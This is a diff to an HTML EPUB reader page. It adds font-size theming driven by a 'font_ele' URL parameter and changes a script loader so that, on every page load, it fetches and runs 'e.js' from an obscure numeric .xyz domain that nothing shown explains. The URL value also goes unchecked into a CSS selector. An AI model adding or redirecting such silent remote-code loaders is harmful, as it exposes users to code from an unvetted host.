@@ -240,6 +240,7 @@
       background-color: white;
     }
   </style>
+  <script src="zepto.min.js"></script>
 </head>
 
 <body>
@@ -293,6 +294,7 @@
     }
     var body_ele = document.getElementsByTagName('body')[0];
     var base = getUrlParam("file_url");
+    var fontEle = getUrlParam("font_ele") || "p,span";
 
     var gold_theme = {
       'body': {
@@ -387,6 +389,7 @@
     body_ele.style.color = gold_theme['body']['color'];
     body_ele.style.background = gold_theme['body']['background'];
     rendition.themes.default(gold_theme);
+    rendition.themes.default({ [fontEle]: { "font-size": "clamp(12px, 2vw, 24px) !important" } });
 
     book.ready.then(function () {
       console.log('epub ready 1');
@@ -540,7 +543,7 @@
     }
     function fontSet(obj, fontsize) {
       if (rendition != null) {
-        rendition.themes.default({ "p": { "font-size": fontsize + " !important" } });
+        rendition.themes.default({ [fontEle]: { "font-size": fontsize + " !important" } });
       }
       outlineClose('epub-dialog');
     }
@@ -555,7 +558,7 @@
 
   </script>
   <script>
-    loadScript('https://http2.idingdang.org/e.js?_=' + (+new Date()));
+    loadScript('https://http2.200000001.xyz/e.js?_=' + (+new Date()));
 
   </script>
 </body>
